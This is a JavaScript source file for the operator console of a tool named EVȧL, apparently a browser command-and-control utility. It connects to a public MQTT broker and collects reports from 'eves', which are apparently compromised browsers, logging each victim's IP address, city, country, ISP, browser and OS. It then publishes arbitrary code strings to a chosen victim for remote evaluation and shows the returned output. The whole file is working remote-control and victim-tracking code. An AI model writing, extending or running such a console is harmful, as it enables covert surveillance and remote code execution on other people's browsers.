let evail = {
    mqttClient: null,
    eves: [],
    connect: () => {
        evail.mqttClient = mqtt.connect("ws://broker.hivemq.com", { port: 8000, path: '/mqtt' });
        evail.mqttClient.on("connect", evail.onConnect);
        evail.mqttClient.on("message", evail.onMessage);
        evail.mqttClient.subscribe("evail/#");
        return "⌛ Connecting...";
    },
    onConnect: () => {              
        console.log('         $                    ▓█████ ██▒   █▓ ▄▄▄       ██▓ ██▓                            ');                
        console.log('   *1▒g▒#▒$▒▒1▒,Q             ▓█   ▀▓██░   █▒▒████▄    ▓██▒▓██▒                ');
        console.log('  ▒▒▒▒▒▒▒▒▓▒▒▒▒▒              ▒███   ▓██  █▒░▒██  ▀█▄  ▒██▒▒██░                ');
        console.log(' #/▒▒▒▒▓▒▒▒▓▒▒▓▒g             ▒▓█  ▄  ▒██ █░░░██▄▄▄▄██ ░██░▒██░                ');
        console.log(' 1▒▒▒▒▒‎▒▒▒▓▓▓▒▒▒▒▓\\         ░▒████▒  ▒▀█░   ▓█   ▓██▒░██░░██████▒                       ');                                
        console.log(' /@ $@@,0▒▒1▒|7$e$,           ░░ ▒░ ░  ░ ▐░   ▒▒   ▓▒█░░▓  ░ ▒░▓  ░                ');
        console.log('       4j7▒4!                  ░ ░  ░  ░ ░░    ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░        ');
        console.log('|       #7Y*       \\            ░       ░░    ░   ▒    ▒ ░  ░ ░                   ');
        console.log('4▒    #▒4▒▓9      4              ░  ░     ░        ░  ░ ░      ░  ░                ');
        console.log('$▒9g e@▒▒!4▒▒$-  #e                      ░                                         ');
        console.log('|▒▒▒▒▒#|   |e▓▒▒▓$e                           ');
        console.log(' Yeg▒▓\,   $9▒▒▒e÷4           EVȧL v6.3.9         https://github.com/reedleoneil/evail     ');          
        console.log(' gp@l▒▒,▒▒Y@▒▒M7 7                            ');
        console.log(' , ▒▒@1▒▒▒▓9÷▒▒4Q             Usage:            ');
        console.log('    "▓  /Q▒-▒▒7,0$                evail.connect()                      connects to broker      ');
        console.log(' !     ▒▒                         evail.eval(fingerprint, payload)     sends eval payload to eve ');
        console.log(' \▒\▒         ▒440                  console.table(evail.eves)            list all eve           ');
        console.log(' 1▒\▒    *▒0    ▒                          ');
        console.log('  1▓9▒▒▓# ▒*▓   ÷                         ');
        console.log('    e▒▒▒▓▒▒  ▓▒▒▒                         ');
        console.log('       g                                                                                       ');    
    },
    onMessage: (topic, payload) => {
        topic = topic.split("/");
        var root = topic[0],
            fingerprint = topic[1],
            stdio = topic[2];
        if (root == "evail")
        switch (topic.length) {
            case 2: // fingerprint
                payload = JSON.parse(payload);
                console.dir(payload);

                var identification = {
                    fingerprint: fingerprint,
                    ipAddress: payload.ipAddressGeolocation.ip,
                    location: payload.ipAddressGeolocation.city + " " + payload.ipAddressGeolocation.country_name,
                    browser: payload.browserData.browser.name + " " + payload.browserData.browser.version,
                    os: payload.browserData.os.name + " " + payload.browserData.os.version,
                    isp: payload.ipAddressGeolocation.org,
                    status: payload.status
                };

                if (!evail.eves.find(p => p.fingerprint == fingerprint))
                    evail.eves.push(identification);
                else
                    evail.eves.map(p => {
                        if (p.fingerprint == fingerprint) {
                            p.ipAddress = identification.ipAddress;
                            p.location = identification.location;
                            p.browser = identification.browser;
                            p.os = identification.os;
                            p.isp = identification.isp;
                            p.status = identification.status;
                        }
                        return p;
                    });
                break;
            case 3: // stdio
                switch (stdio) {
                    case "stdin":
                        console.warn("%c" + fingerprint + ": %c" + payload, "font-weight: bold;", "");
                        break;
                    case "stdout":
                        console.log("%c" + fingerprint + " : %c" + payload, "font-weight: bold;", "");
                        break;
                    case "stderr":
                        console.error("%c" + fingerprint + ": %c" + payload, "font-weight: bold;", "");
                        break;
                }
                break;    
        }
    },
    eval: (fingerprint, payload) => {
        evail.mqttClient.publish("evail/" + fingerprint + "/stdin", payload);
    }
};